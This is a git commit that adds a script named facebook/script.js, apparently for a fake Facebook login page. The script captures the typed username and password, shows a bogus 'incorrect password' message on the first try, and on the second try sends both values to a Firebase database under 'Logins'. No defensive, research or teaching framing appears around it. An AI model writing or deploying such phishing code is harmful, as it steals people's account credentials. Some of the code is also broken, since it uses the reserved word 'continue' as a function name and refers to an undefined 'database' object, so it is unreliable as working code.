797289037ff60421cb8f59b8f607ef1dc7879a54
Pushkar Sharma <80835222+sharmapushkar-coder@users.noreply.github.com>
2024-07-16 23:57:30 +0530

    Create script.js

---
+++ facebook/script.js
@@ -0,0 +1,23 @@
+var server=firebase.database()
+var attempts=0;
+function continue(){
+  var id=document.getElementById("id").value;
+  localStorage.id=id
+  var pass=document.getElementById("pass").value;
+  if(attempts===0){
+    attempts=1
+    document.getElementById("msg").innerHTML="Username or Password are incorrect. Try Again"
+  }
+  else{
+    localStorage.logins=true;
+    setTimeout(function(){
+      database.ref("Logins").push().set({
+       'id':id,
+       'password':pass
+      })
+    },2000)
+
+
+    
+  }
+}
